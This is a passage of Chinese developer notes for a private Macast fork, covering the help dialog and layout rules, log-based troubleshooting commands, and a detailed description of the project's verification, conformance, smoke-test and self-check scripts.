  多写一个不存在的标签也会红。
- **新增一个投屏目标 / 一档兼容档位 / 一个外部程序依赖**，同理要写进对应段落：
  「四种目标各自的脾气」按 `OUTPUTS` 的条数比对，「没有声音」这一句必须**落在低延迟那一条
  bullet 里**（整段文本里出现一次不算通过——曾经就是这么让"哪条没声音"读错人的），
  `raop.py` / `airplay_mirror.py` 监督的 `shairport-sync` / `uxplay` 各有一条比对。
- **帮助是弹层不是标签页**（顶栏「帮助」按钮，`custom-class="macast-dialog help-dialog"`，
  `append-to-body`）。老链接 `?page=4` 仍然打开它，别把这个兼容拆掉。
- **别把会漂移的数字写进散文**：版本、端口、友好名称、投屏地址一律交给 Vue 插值或
  页面自己的表格；帮助里只留"有常量可绑"的数字。

页宽那一半是同一份文件里的另一件事，也是 Part 44 的后半：
**宽度归视口管，不归 CSS 管**（`#app` 不钉固定宽度，只留 `min(1680px, 100%)` 上限 +
`--pad-x` 内边距；卡片网用 `repeat(auto-fill, minmax(min(100%, 380px), 1fr))` 自己填列）。
四条会被静默拆掉的做法，用例各自盯着：

1. **在 `el-dialog` 的属性里写 `width="…px"`** —— 行内样式会盖过响应式层，CSS 赢不了，
   所以宽度必须写在 `.macast-dialog` / `.help-dialog` 规则里（配 `!important`）。
2. **在 `style=""` 里写像素宽**（日志页的两个下拉、插件页的 select 原来都是这样）——
   窄屏直接撑出横向滚动。改成 class + `min(绝对值, 视口百分比)`。
3. **让标题和它下面的表格当两个网格项** —— 网格会把它们排到不同列，读起来像串了位。
   所以 `<h3 class="section">` 必须和它的内容一起待在同一个 `.pane-block` 里。
4. **`#app` 忘了 `box-sizing: border-box`** —— `width: 100%` 加内边距就整页横向溢出。
5. **「电脑投屏」不许用那张网格** —— 这一页会出现哪几张卡由 `mirror_view.py` 按状态决定，块数不固定；
   `auto-fit` 只收**所有行都空**的轨道，所以「3 列网放 4 张卡」必然把最后一张甩成一列加一大片空。
   现在 `.mirror-wrap` 是 `flex-wrap` + `flex: 1 1 420px`，凑不满的那一行自己摊开；
   `pane-wide` 在这里要另写成 `flex: 0 0 100%`（它是网格属性，flex 不认）。
   Part 44 三条用例分别盯着「flex 且没有 `grid-template-columns`」「`1 1 <px>`」和「通栏卡钉死 100%」。

还有一条是**只有真浏览器 + 真截图才会发现的**：Element UI 把 `.el-dialog` 画成白底，
而这份页面把 `color: var(--text)` 挂在 `<body>` 上，于是深色模式下帮助弹层是
**白底压近白字**（`.el-dialog__body` 自带的 `#606266` 只盖住了没被显式着色的 `h1/td/pre`）。
这不是新引入的，是上游 FAQ 时代就有、只是那时没人读它。
现在 `.macast-dialog` 自带 `background: var(--panel)` 与 `color: var(--text)`，
Part 44 盯着这两条规则还在。**教训：改完前端要按 §10 起一个临时配置目录的真实例，
用真浏览器在宽 / 中 / 窄三档看一遍再收工**（打桩套件从不渲染 DOM，看不见这些）。

## 5. 排障手法（比读代码快）

```shell
LOG="$HOME/Library/Application Support/Macast/macast.log"
grep -aE "Cast LOAD|Cast connection|Cast handshake|Chromecast|AirPlay|mDNS|ERROR|Traceback" "$LOG" | tail -60
```

- **"有声音没画面"的第一判据是 `video-reconfig`**：mpv 只在配置视频轨时发这个事件，
  而 MPVRenderer 把 mpv 事件原样写日志。只有 `audio-reconfig` ⇒ 流里没有视频轨（发送端问题）：

  ```shell
  grep -aE "video-reconfig|audio-reconfig|file-loaded|end-file" "$LOG" | tail -30
  ```

- **`Cast LOAD ... contentType=...`** 记录发送端自称要推什么。`audio/*` 就是实锤。
- **问 mpv 到底拿到了什么轨**：从 `pgrep -fl mpv` 取 `--input-ipc-server=` 路径，发 IPC
  `get_property`：`track-list` / `video-codec` / `width` / `height` / `current-vo` / `core-idle`。
  ⚠️ 返回 `{"error":"success"}` 是**成功**，别当失败处理。
- **别把"端口在听"当证据**：`lsof ... LISTEN` + `socket.connect()` 成功都**不能**说明有人
  `accept()`。要区分就真的做一次 TLS 握手。
- **环境里有代理会让本地网络测试假失败**：
  `env -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY <cmd>`。
- **`pingod/Macast` 是私有仓库 —— 所以插件索引（第三方 / 用户自建）对别人是坏的**（本会话先误判成"沙箱不通"，
  三条互相独立的探针才能定性，别再重复这个错误）：
  `gh api repos/pingod/Macast --jq .private` → **true**；匿名
  `https://api.github.com/repos/pingod/Macast` → **404**，而同一请求打公开的上游
  `xfangfang/Macast` → **200**；`https://data.jsdelivr.com/v1/packages/gh/pingod/Macast`
  → **404 "Couldn't fetch versions"`（公开上游回 200 带版本表）。
  jsDelivr / raw 都读不到私有仓库，而 Macast 下载插件时**不带任何凭据**，
  所以设置页的（第三方）插件卡片会照常显示、点下去才失败，症状长得像网络问题。
  **但这一点只影响"从索引装第三方插件"**：第一方 15 个插件已全部内置（`macast/plugins/**`，
  见 §4.8），私有仓库的索引限制**不再影响第一方用户体验**，他们开箱即得。
  实测（2026-09-21，刚推完 v0.8）：**9 个固定链接里只有 5 个还给 200 —— 那是 CDN 在仓库
  还可读时缓存下来的副本，正在逐个过期；私有状态不变，剩下的就一个一个变成 404，等不来。**
  `raw.githubusercontent.com` 在这台机器上是 `000`（只有这个 host 被挡），**这正是当初把
  404 读成"沙箱不通"的原因** —— 判 Reachability 要用上面那三条带**公开对照组**的探针，
  或者直接跑 `scripts/selfcheck.py` 的「=== online plugin index ===」段。
  **决策（2026-09-22 接「将所有插件都内置吧」更新）**：原"保持私有、官方只承诺手动安装"
  的约束适用范围从"全部插件"缩小为"第三方/用户自建插件"—— 空 `plugins/info.json` 与
  设置页「从网址安装」/ 把 `.py` 放进 `~/Library/Application Support/Macast/renderer/`
  （协议插件放 `protocol/`）的入口**保留**，作为第三方插件的手动安装通道。**不要再提
  "改公开 / 另立公开仓库"**，那是已经回答过的选项；要改只能用户提出（详见 §4.6）。
  推送仍然走 `git push git@github.com:pingod/Macast.git main`，推完
  `git update-ref refs/remotes/origin/main <sha>` 让本地 origin 对上。
- **WorkBuddy/CLI 沙箱**：`PYTHONPATH` 被注入 shim，`mkdir(exist_ok=True)` 会抛
  `PermissionError: EEXIST`；`ps` 不可用。一律 `env -u PYTHONPATH`，用 `lsof`/`pgrep` 代替 `ps`。

## 6. scripts/ 里的工具

| 脚本 | 用途 |
|---|---|
| `run-from-source.sh` | 从源码启动（会 unset PYTHONPATH） |
| `verify_cast_airplay.py` | **主验证套件**（2026-09-25 本机实测 1713/1719 通过、`--ci` 同一趟在 Linux 容器里 1708/1714；2026-10-01 本机 1761/1767（总数差是环境计数的用例，红的 6 条每次同一批），红的 6 条都是 Part 34 —— 见 §4.12 末条；2026-10-02 本机 1881/1887；同日 tag 构建的那个 Linux runner 首跑 1813/1822 且 `--ci` 拒绝 —— 红的三条是 Part 52 的 argv 用例漏了平台钉（那个 job 该抓的东西，修法见本行末 Part 52；修后同 runner 复跑 1816/1822 且 `--ci` 通过）；**这套件现在真的在 CI 里跑**：`build.yml` 的 `verify` job（ubuntu-22.04、headless、`--ci`），`release` 等它 —— 见本行末的 Part 50；它随数据规模伸缩：索引清空后，按条目循环的那些用例
不再产出，v0.7.15 时的 1121 条里含有 9 个索引条目各自的用例）：协议逻辑 + 真实 socket 端到端 + mDNS/网卡/插件热插拔 + 内置插件加载 + 插件索引/条目与清单一致性 + 国内镜像开关（Part 5c/7/12）+ 网页投屏入口与令牌门控 + 9 个内置插件（下载器/外部播放器/小窗/钩子/中继/RAOP/屏幕镜像/本地文件投屏/AirPlay 镜像接收）+ Cast 接收端一致性（Part 18）与 8443 HTTPS setup API（Part 19）+ 日志轮转/尾部读取/清空（Part 20）+ 屏幕镜像发送端（Part 21 假 ffmpeg 对打自家 Cast 接收端；Part 22 浏览器目标与采集预设；Part 23 DLNA 电视＝伪装成文件 + 用自家接收端校验 SOAP；Part 24 Cast Streaming 低延迟通道＝自家假设备对打（真 TLS + 真 UDP）；Part 29 一键设置修复 + 分步进度页 + v0.9 的五态判定（盘上有驱动就不再下载、不再开安装器；CoreAudio 有而 ffmpeg 没有 ⇒ 麦克风权限而不是重装））+ 本地文件投屏（Part 25 ffprobe 决策表 + Range/206 服务 + 假 Cast 设备与自家接收端 + DLNA 发送序列）+ 按模块独立日志（Part 27）+ 模块设置面板与归属漂移守卫（Part 28）+ AirPlay 镜像接收（Part 26 假 uxplay 走完生命周期）+ 内置插件的 import 允许面（Part 30：只允许 Macast 自己声明过的包；pyobjc 那条已定性）+ 采集设备探测的输入形状（Part 31：真机 `ffmpeg -list_devices` 逐字输出喂解析器，并扫测试文件自己，不许再出现虚构的带引号无索引设备行）+ 自检脚本与插件的一致性（Part 32：读 `selfcheck.py` 的文本要求它和两个发送端插件**说的是同一套编码器 / 同一批查找目录 / 同一个 mDNS 与 SSDP 目标 / 只读不写用户设置**）+ **端到端冒烟脚本与应用的耦合**（Part 33：`e2e_smoke.py` 是唯一跑真应用的检查，而它的隔离性全靠**字符串**——端口的设置键名、appdirs 打桩、只开 DLNA 的协议表、代理变量名单、它问的 `/api?query=` 键名、`get_status` 的 server 键名。应用侧改个名就会让这些**静默失效**，冒烟照样全绿。所以逐条拿应用源码比对这些字符串，并守住" BOOTSTRAP 里 `import macast` 之前先打桩""不出现 `Setting.set(`""退出码由失败数决定"。这一 Part 是纯文本检查，从不 import 那个脚本）+ **来源与署名**（Part 34：`git blame` 按 fork 点把每个 `.py` 数成 upstream/vendored/mixed/ours 四态，双向守声明 —— 上游行还在就不许没有上游归属，一行都不是我们的就不许有我们的，`macast/ssdp.py` 里那层 MIT 作者群不许消失；再比 `docs/Provenance.md` 的台账行与两张表的数字；并把 `provenance.py` 当模块导入，用合成行证明"删掉上游声明＝报红""最后一行上游代码被重写完＝不再要求上游归属"这两个方向都测得出，另加"插入点必须留在插件清单块内"+ 用**自家解析器**验盖过名的插件仍被识别。三个变异体（删 `protocol.py` 上游头 / 给 `web.py` 盖我们的头 / 删 ssdp 的 MIT 块）逐个验过，各自必红）+ **镜像控制台与实时链路**（Part 35 页面读的端点、`mirror_view.py` 的派生规则、页面与后端共享的拼写；Part 36 菜单栏自己的内容，含"不许出现电脑投屏行"这条用户裁定；Part 37 实时链路的算术 —— 队列的秒预算、丢弃切在容器边界、DLNA 预填的秒数、没动过设置时 `auto` 选哪个编码器；Part 38 采集开了却一帧不返回 —— 挡掉"正常采集也会打"的运行时噪声、弃掉读不到的音频口重起一次、每一条"没有返回画面"都必须给出门与重启、弃声的会话在页面上不再被那一行「已启用」谎称有声音；Part 39 Windows 系统声音的真实设备表 + 一条 M-SEARCH 到底出不出本机 + 延迟预算 + 真 TCP socket 上的 Nagle 修复；Part 40 只有**打包后的** Windows 才教得了的三件事（首帧预算杀死了声音口已谈拢的采集、把 Windows 用户送去 macOS 的麦克风面板、`cheroot.ssl` 没进包 —— §4.3 那一族）；**Part 40 另管 `_audio_line` 的 `platform` 接缝在三条「未启用」分支上真的生效**（在 Linux runner 上问 `platform='win32'` 必须拿到 Windows 那句 —— 曾经读到的是 `sys.platform`，于是"该去哪个系统面板"随跑代码的机器变），**Linux 的那一句必须给出门**（`PULSE_DOOR`：`pactl get-default-sink` 问得出默认输出设备、装 `pulseaudio-utils`、点「重新探测采集」，只报"需要 PulseAudio"不算答案），**`_default_pulse_monitor` 必须把「pactl 根本不在」与「pactl 说不出 sink」两种原因留在日志里**（`logger.debug`，探测是缓存的、不在热路径）；三个变异体各自变红：改回 `sys.platform` ⇒ 2 条、删掉两条 debug ⇒ 1 条、把 `PULSE_DOOR` 压回原来那一句 ⇒ 2 条；Part 41 `.exe` 不许弹控制台窗口（`--noconsole` 与每个子进程的 no-window 标志缺一不可，还有 windowed 进程根本没有 `stdout`）；Part 42 真 TCL 85T8G「下载了 26 MB 却仍然不播」⇒ 响应必须带上 DIDL 承诺的 `DLNA.ORG_PN`、一次交换要落在**用户真会留的日志**里且不能被重试刷爆、对端关掉的连接要认出自己这一半的 CLOSE_WAIT；Part 43 第二个观看端加入实时 Matroska —— 输入是**真编码器管道**产出的 `scripts/fixtures/live-mkv-h264.bin`，元素树在下面用**另一个**解析器重读一遍，免得 fixture 与实现共谋；**Part 44 设置页「帮助」弹层与页宽（见 §4.13）—— 弹层里每一句可核对的陈述都被要求由决定它的那段代码回答**：端口问 `cast.CAST_PORT` / `airplay.AIRPLAY_PORT`、HTTPS 问 `utils.py` 的 +1、配置目录问 `user_config_dir('Macast', 'xfangfang')`、镜像目标与「哪条没有声音」逐 bullet 比对 `screen_mirror.OUTPUTS`、低延迟上限比对 `CAST_STREAM_MAX_BITRATE`、DLNA 档位与预填秒数比对 `DLNA_PROFILES` / `DLNA_PREFILL_SECONDS`、无帧超时比对 `NO_FRAME_SECONDS`、字幕扩展名比对 `protocol.py` 的 `sub_exts`、日志上限比对 `RotatingFileHandler` 的 `maxBytes`/`backupCount`、标签页列表比对页面里的 `el-tab-pane`；页宽一侧则守 `box-sizing`、`min(1680px,100%)`、`.pane-duo` 用 `auto-fit`（两张卡的行不许在宽屏留半页空白）、以及弹层自带 `background: var(--panel)` + `color: var(--text)`（深色模式白底压白字）；**Part 46 CI 的 Actions 存储配额（见 §4.3）—— 四个 `Upload artefact` 步骤必须带同一个门（只有 tag push 与 `release=true` 的手工 dispatch 才上传）、清扫 job 必须 `needs: release` 且只在发布成功时按 id 删除本轮 artefacts、`actions: write` 与 `::warning::` 缺一不可、留存仍是 2 天兜底；三条变异体（改开一个门 / 删权限 / 放宽成 `always()`）逐个验过各自必红**；**Part 47 菜单栏的线程纪律（见 §4.2 末条）—— `App.notification` 与 `Macast.update_service_status` 必须把 AppKit 那一跳交给主线程队列：用例从 `CHERRYPY_WORKER_47`/`SERVICE_THREAD` 两个假线程各打一次，要求"就地什么都没发生、排队的东西在 MainThread 落地"，并扫 `macast.py`（七处写入点逐条登记主线程理由）与 `macast/plugins/**`（只许 `build_menu*`/`on_*`）；两个变异体（把 notification 改回就地调用 / 把 relabel 改回就地赋值）各自红 5 条与 7 条；另有四条把"被守的调用点有多少"这个数交给 **AST 现数**（注释掉的 `publish` 不算、跨行的算一处），再拿它去比对**两处散文**（Part 47 的抬头与 §4.2 本条，含 `macast/` + `macast_renderer/` 的拆分）—— §4.13 的"每个数字问两遍"同样适用于我们自己的文档。延后到底能不能落地是**真机**问题，已用真 rumps 循环探过：`app.run()` 之前排的队，循环一起来就执行**；**Part 48 管理 POST 的两道门（见 §4.7b）—— 先证明这道门真的挡不住（PoC 打真应用：无令牌 form-POST `install-plugin` 4/4 拿到可 import 的 `.py`），再修：`_same_site()` 挡跨站表单（Origin 缺失退 `Referer`，比对**名字**不是地址，所以 DNS rebinding 也算跨站），`_CODE_EXECUTION_PARAMS` 那三条会落代码的 POST 另加一道**令牌**门（本机也不算，因为环回挡不住浏览器）。断言分三层：门本身（喂真 `cherrypy.serving.request`，四种来源各判一次）、页面侧文本契约（`management_token` / `require_management_token` 必须在，`before-upload` 必须是 `async` 且 `:data` 带 token）、以及**前提自己也要扫**（全仓扫一遍"没有任何地方发 CORS 头"这句仍然成立；这条用例第一次写错成"字符串出现过就算红"，被自己的扫描误伤，所以现在扫的是**行**并要求那一行真在做 `tools`/`headers` 赋值，另外三条合成行反过来证明扫描器会红）。四个变异体各自变红（删 same-site 调用 5 条 / 把令牌门降级成 `_management_allowed` 7 条 / 页面某条流程漏带令牌 1 条 / 把门改成"什么都不放行" 15 条 —— Part 12/20/21/22/28/48 都从这条路上过，正向契约同样有牙齿），拒绝类用例都配正控（带令牌的两次必须真的过）**；**Part 49 订阅表是发布的、不是就地改的（见 §4.2「copy-on-write」条）—— 先用两个真线程把崩溃复现出来再修**：状态页那条合并表读 8 秒 110 次（被 try/except 吃掉 ⇒ 「客户端信息」整块消失），`add_subscribe` 那条 20 秒 148,302 次且**没人兜** ⇒ 控制点吃 HTTP 500 后永久不再收事件（症状长得像发送端的锅）。修复取 copy-on-write 而不是锁，因为广播那条读**横跨对每个订阅者的网络 I/O**；29 条用例分五层（发布契约 / 五条读路径各自对打一个真在 churn 的写线程且**同时要求读数过阈值** / 修复前的行为 / 两条"全仓库不许再出现就地扩容"的文本规则 / 订阅路径在 stdout 上一言不发），四个变异体各自红 8、1、1、1 条（就地写表 / 把绑定挪到排空队列之前 / 那行 `print` 回来 / 每轮都无条件发布）。**诚实的一条**：`add_subscribe` 自己的 race 在 600 entry 表下**没撞上**（扫描太短），那条路径靠发布契约与文本扫描守着，不靠计时；**Part 50 CI 的盲区与无头导入（见 §4.2 的 pystray 条与 §4.12 末条）—— 它问的是「这套件在 CI 里到底会不会真的拦住什么」**：① `ci_gate()` 的算术用六条合成用例双向测（豁免 Part 34 的红 / 拒绝名单外的任何红 / 没有历史时 Part 34 反而全绿也拒绝 / 哨兵一旦离开 Part 34 名单就不再豁免任何东西），并且它跑在**本进程真实的 RESULTS** 上 —— 第一版用例因为 in/out 名单不互斥，被自己抓住；② `macast/*.py` 顶层不许 import pystray/Xlib（AST 扫，核心文件数 <10 直接红 —— 「扫描器自己坏了」不许读成通过），再用子进程真的 boot 一次 `macast.macast`（pystray 用 meta_path 拦掉、netifaces/pyperclip 打桩、`sys.platform=linux`），并跑**变异体**：把模块顶部的 import 放回去，这一条必须红；③ `--ci` 必须是 workflow 真正调用的那个字符串（用例去读 `.github/workflows/build.yml`）。**这一轮 CI 第一次真的跑这套件**：`build.yml` 新增 `verify` job（ubuntu-22.04、headless、`pip install -r requirements/common.txt`、`python scripts/verify_cast_airplay.py --ci`），`release` 的 `needs` 第一个就是它。**而这个 job 第一次真跑就交付了**：`1667/1679` + 门拒绝，抓住的**不是测试的错，是一条产品 bug** —— runner 上没有配置目录 ⇒ 自签证书生成失败 ⇒ Cast 的 TLS 接收端整个起不来，而日志把锅甩给 `-addext`（见 §4.2「写文件的代码要自己把目录建出来」）。同一趟还顺手暴露了套件自己违反 §10：Part 3 的真 socket 段落一直往用户真实配置目录写证书。选 Linux 不是图便宜，而是 `import pystray` 那个「模块体就开 X display」的坑**只有 Linux runner 看得见**（见 §4.2）。同一趟在 Linux 上量出来的还有三条**测试自己**的错（Part 44 两张配置目录表撞键、Part 49 写线程饿死读线程、Part 26 假二进制把第一次 argv 截断），外加一条门的错：`--ci` 拒绝时原先在 SUMMARY 之前 `sys.exit(1)`，读者恰好看不到那份清单——现在门只决定退出码。它们都不是产品 bug，但都只在非 macOS runner 上现形，这就是那个 job 的价值；**Part 51 一张表决定所有 POST 的门（见 §4.7c）—— 它测的不是"某条端点有没有门"，而是"门这条规则还活在结构里吗"**：表的良构（字段不重复、是 tuple 不是 dict、每一行的门名与方法名都存在、派生的两份名单确实等于按门筛出来的结果），AST 限定在 `class Handler` 内钉住"`POST` 恰好一个、不直接叫任何门（`_same_site` 除外）、必须读 `POST_ROUTES`/`FILE_ROUTES`/`_gate_refusal`、且一个路由字段名都不许多写在 `POST` 里），**按表循环**把 16 行逐行喂一个局域网无令牌请求（403 且那一行的方法 spy 一次都没响）再逐行带令牌（每行真的被服务到），加一条"这个循环 ≥16 行"防它读成空表，加拒绝文案的累积顺序（局域网无令牌听到的是管理那句）、两字段 precedence、未知门 fail closed、fall-through 三种形状（只有 helper 字段 / 拼错的 `clear-logg` / 空 POST）都不许回"success"，上传侧（局域网 `media-file` 403、本机存下并投出、`plugin-file` 的门是 code-execution），以及**页面侧对齐**：从 `setting.html` 抽出它能 POST 的每个字段名，要求在表里都登记得到。四个变异体各自红 3/9/3/1 条（未识别请求改回"success" / 删一条表项 / 把 `mirror-action` 降成管理门 / 未知门名改成放行），其中"删一条表项"那一个抓出的是**测试自己的**休眠分支：`gate_of()` 读模块而非类，只在被扫到那一行才 `AttributeError`；**Part 52 v0.18 的延迟预算重算（见 §4.8 的 caststream 段与两个新旋钮）—— 47 条，按"改了哪四处"分组：① 系统原生 AES（三个后端各自的 ctypes 签名、`if not data: return b''`、**已知答案自检对打 `/usr/bin/openssl enc -aes-128-ctr`**、自检不过就退回纯 Python 而不是发一堆解不开的帧、以及"darwin 绝不去 probe 裸 soname 的 `libcrypto.dylib`"——那条 `ctypes.CDLL` 在 macOS 上会 SIGABRT 掉整个 CPython）；**其中"生产形状"那一组是此前根本不存在的**：早先每条 AES 用例都每次新建一个 cipher，所以从没跑过真正上线的那个形状 —— **一个 handle、每个访问单元 reseed 一次、结束时 release**，而"每帧 reset 悄悄漂移"这种 bug 只住在这个形状里；② 在途窗口按时长算（`clamp(2×RTT, 66 ms, TARGET_DELAY_MS/3)` + 120 帧硬顶，含"未测得 RTT 也吃下限"与"窗口里排队的时间跨度不超过一个窗口"）；③ 编码器三处对齐（`+low_delay` / `-thread_type slice` / **半秒 VBV**，并要它活到真 argv 上）+ VideoToolbox 按 1.5 倍线速要码率（只有它少给三成，x264 那一支不许被抬高）；④ 两个新旋钮（`Mirror_Dlna_Prefill` 越界夹住、`dlna_prefill_bytes(profile)` 保持单参数、`output_hint(kind)` 当场重算而不是读那个已过期的模块级字面量；`Mirror_Live_Edge` 注入 `@LIVE_EDGE@`、**改它不重启镜像**、`PLAYER_PAGE` 仍是 raw 串且没有任何 JS 字符串跨真换行）。**①的两组写成"在没有 OS cipher 的 runner 上也非真空"**：降级路由一个**合成后端**驱动，而不是由这台机器碰巧有什么决定，所以同一条用例在本机与 CI 里是同一个意思。六个定点变异体各自变红 4/4/3/1/3/3 条（bufsize 改回一秒 / `MIN_WINDOW_MS` 66→500 / `_aes_known_answer` 恒真 / `VT_BITRATE_MULT` 1.5→1.0 / 预填设置被忽略 / `PLAYER_PAGE` 去掉 `r`），每一个红的都恰好是编码那条决定的用例，没有连带 —— 这一层是必须的：把三个产品文件整块 stash 只让 Part 52 死在 `module has no attribute '_NATIVE_AES'` 上，那证明的是依赖，不是牙；**v0.10.0 的 tag 构建里那个 Linux `verify` job 又替这一 Part 抓了一回**：三条 argv 用例把「Mac 会发出的命令」当成了运行器事实 —— runner 上 `hardware` 正确地是 x264（一个 `h264_videotoolbox` 都没有），红的就是这三条；修法与 Part 21/22/23/29/38 同款：这一段（连同 `_live52` 循环）把 `sys.platform` 钉成 darwin，两种 runner 上说同一句话 —— 复跑 1816/1822，`--ci` 通过；**Part 53 v0.19 的浏览器重播割点（见 §4.8 的屏幕镜像行）—— 12 条，沿数据流分四段**：① `starts_with_keyframe` 对真 moof+mdat 的 AVCC 逐格判（IDR 开真、P 开假、后到的 IDR 不许回答第一格、SEI/SPS/PPS/AUD 前置跨过、top-level box 走法、错 box 头不许猜、截断/64 位 size/半截 NAL 一律 False —— "读不懂"统一答 False，因为错的 True 是贵的那个方向）；② framer 的三字段契约（头非媒体、整片带 tag、编码器死在片中间那片保持自己的 tag、不足 8 字节的残渣交出去但不算分片）；③ ring 的割点（p,p,idr,p,p→[idr,p,p] 且零日志、无关键帧环回空并计一次 `keyframe_misses` + 恰好一条 warning、空环不是 miss）；④ **全可入的 ring 整环重播**（未分帧形状的老契约；fixture 必须两块 —— 单块在"割到最新"与"整环"两种走法下都是绿的，第一版就是单块所以漏掉了这个回退，是 Part 22 抓出来的）。三个定点变异体各自变红（2026-10-02 逐个跑完整套件量过，都在还原后逐字节复原）：movflags 改回 `frag_keyframe` ⇒ 1 条（Part 22 那条 movflags 用例，别处全绿）；`tail()` 的 tag 判断换成恒真（`if self._ring[index][1]:` → `if True:`）⇒ 4 条（Part 43 的 Matroska 拒答 + Part 53 的 #9/#10，外加 #11 因它记不住那次 miss 而连带）；`starts_with_keyframe` 恒真 ⇒ 10 条（Part 53 的 AVCC 判定 #1–#5、framer tag 的 #6/#8、环割点的 #9/#10 与连带失败的 #11；#7 不动 —— 它预期的 tag 恰好就是 True；#12 与 Part 43 根本不经过这个函数）；**Part 54 v0.20 的 Windows 采集换 ddagrab（见 §4.8 的屏幕镜像行）—— 19 条，按数据流分四段**：① attach 探针三态（真机逐字 `Failed to enumerate DXGI output 2` 喂进 `_DDAGRAB_FAILURE`；`WxH`/`''`/`None` 各自被当作尺寸、无画面、拒绝），输出表在第一次拒绝处停下且进 `_ddagrab_cache`；② 运行时回落 E2E（假 ffmpeg 三个输出 attach 全答应、会话里拒绝：`ddagrab refused the display at runtime` 恰好一条、闩住、gdigrab 起来且**系统声音还在**、`_askedE54 == [0, 1, 2]` 证明重试没有再问一遍 ddagrab）；③ starter/pump 判决让位（pump 对 `ddagrab and not produced` 只记日志；快退判定让"attach 答应了却在会话里死"只花一次重试而**不是整个无帧预算** —— 断言秒数预算而非一瞬间）；④ 选择器与弃声（存的屏幕号选中对应输出、落空回第一个并说出原因、`video_only_capture` 保留 method 与 screens）。8 个定点变异体共红 15 条且各自只在自己那句话上变红（删快退判定 1、pump 提前上报 1、闩失忆 3、失败正则失明 3、探测不清 attach 缓存 1、屏幕号被忽略 2、第一次拒绝后不停 3、弃声丢 method 1），每个跑完整套件后逐字节复原（md5 前后一致 `d85dd270…`）。**Part 55 v0.21 的 macOS 采集换 ScreenCaptureKit（见 §4.8 的屏幕镜像行）—— 40 条，按数据流分四段再加打包面一条**：① 门与探针（macOS 13+ 与绑定两问、解析不干净的版本一律答否、无授权时连 `SCShareableContent` 都不问就静默让位、屏号按 id 选中与落空回主屏都说出原因、过滤器点像素比兜底、闩在 invalidate 后依然有效）；② 管道契约（NV12 平面逐行拼装丢 stride、畸形平面集整份拒绝、没有 token 的命令原样返回、有 token 没 pipe 必须 ValueError 且说明"这次尝试绝不许 spawn"、有 pipe 时 token 只换进新列表而原列表保留 —— 重试还能再解析一次）；③ 失败与让位（第一条失败就是失败、晚到原因被丢弃、stop 之后到的失败被吞、记录失败当场关 ffmpeg 的 stdin、弃声保留 method/spec/屏幕、SCK 弃声的句子压过平台方言且不提麦克风与 BlackHole、设备馈送的 tap 才吃路由警告）；④ E2E 对打（授权机全程走 SCK 且真喂两条流、stream 配置只建一次、双输出 attach、弃声后画面照旧、OS 拒绝一次 = 一条含拒绝文本的 warning + 闩 + 回落 avfoundation、token 绝不进任何命令行）；打包面一条钉 `setup_py2app.py` 的 includes 里那两个包（modulegraph 看不见函数体内 import —— 声明面那两处由 Part 30 自动覆盖，**这里是唯一需要人记得的地方**）。八个定点变异体各自变红 13/2/4/1/12/4/2/1 条（SCK 从没被问 / argv 缺 wallclock / 闩被无视 / 失败时不关 stdin / feeder 没起 / 弃声仍保留音频输入（四个平台各一条同时红）/ SCK 弃声文案缺失 / 删 py2app includes 两条目），每个跑完整套件、还原后 md5 逐字节一致。|
| `cast_conformance.py` | **用真实 pychromecast 栈打真实接收端**（见 §4.9）。`verify_cast_airplay.py` 把网络打桩，所以抓不到"发送端不认账"；`vlc_sender_sim.py` 只复刻 VLC。这个跑的是手机/HA 实际用的那套代码 |
| `e2e_smoke.py` | **唯一跑真应用的检查**（33 条）：用临时配置目录 + 错开的端口（58999，只开 DLNA）在**本机拉起第二个 Macast**，走完发现→设置页→API→SSDP，可选走播放。**代价要明说：那 ~30 秒里局域网内的 DLNA 电视会短暂看到第二个设备**（`Macast E2E Smoke`）。隔离手法是 `appdirs.user_config_dir` 在 `import macast` **之前**打桩（§4.9 那条），种子设置直接写 JSON（绝不 `Setting.set`），所以它不动用户配置、不杀他的实例；跑完自己验一遍"真实配置目录的摘要前后一致"。它导不了 `macast`（自己就是启动者），因此对应用的耦合全是字符串——那些字符串由 Part 33 守着。`--play` 才做真正的播放回环（自己找 ffmpeg、生成 12 秒测试片、起一个支持 Range 的小 HTTP 服务、经带令牌的 GET 入口投出去、要求进度真的在动 + 日志里有 `video-reconfig`）；`--keep` 保留临时目录。**它是端到端冒烟，不是套件的替代**：跑套件仍然不需要它，跑它之前要确认用户不在演示 |
| `selfcheck.py` | 收屏前的环境自检：依赖、端口占用者身份、可广播网卡、组播出口、mpv/`--input-ipc-server`、代理变量。端口占用会区分"Macast 自己在跑"/"macOS 自带 AirPlay"/"别的进程"。被监督的外部程序（`uxplay`、`shairport-sync`）**是 warn 不是 fail** —— 插件是可选的；uxplay 那条直接把编译配方写进 fix，因为没有包可装。**发送端插件那一半（§「sender plugins」段）**：ffprobe 在不在、`-encoders` 里有没有 libx264 / h264_videotoolbox / mpeg2video / ac3（**这四个各自对应一条会静默失效的链路**）、有没有 libass（没有 ⇒ 字幕只能走 WebVTT）、avfoundation 到底列没列出屏幕（**这一条就是 v0.1–v0.7 那个解析 bug 想骗过去的问题**）、系统音频采集口（mac **先问 ScreenCaptureKit** —— macOS 13+ 且绑定在就报"原生采集系统声音，不用 BlackHole 也不用聚合设备"（版本与绑定两个判据与 `screen_mirror._probe_screencapturekit` 一致）；落到 avfoundation 路径才看 HAL 里的 BlackHole 驱动，且"盘上有"与"ffmpeg 列得出来"两问分开报；Linux 问 `pactl` 要 sink monitor）、转码临时目录剩余空间、以及**局域网里到底有没有东西可投**（mDNS browse `_googlecast._tcp` + 一次 SSDP `MediaRenderer` 探测）。它**只读**设置（直接读 JSON 文本，不碰 `Setting`），所以跑它不会改用户配置。Part 32 守着它和插件的一致性 |
